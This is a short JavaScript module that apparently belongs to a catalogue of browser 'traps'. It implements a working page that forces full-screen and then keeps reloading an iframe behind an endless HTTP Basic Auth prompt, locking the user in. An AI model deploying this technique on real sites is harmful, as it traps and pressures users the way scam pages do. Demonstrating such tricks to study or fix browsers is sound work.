import EvilTrap from '../../EvilTrap';

export default new EvilTrap('Full-screen Auth Prompt', EvilTrap.CATEGORY.FULLSCREEN, 'Use HTTP Basic Auth prompts to trap the user in full-screen.')
  .addScriptPage(() => {
    const button = document.createElement('button');
    button.innerText = 'Click Me';

    button.addEventListener('click', async () => {
      button.style.display = 'none';
      await document.body.requestFullscreen();

      const iframe = document.createElement('iframe');
      iframe.src = 'auth';
      iframe.addEventListener('load', () => {
        iframe.contentWindow.location.reload(true);
      });
      document.body.appendChild(iframe);
    });

    document.body.appendChild(button);
  })
  .routeBuilder((router) => {
    router.get('/auth', (req, res) => {
      res.set('WWW-Authenticate', 'Basic realm="Trapped"');
      res.sendStatus(401);
    });
  });
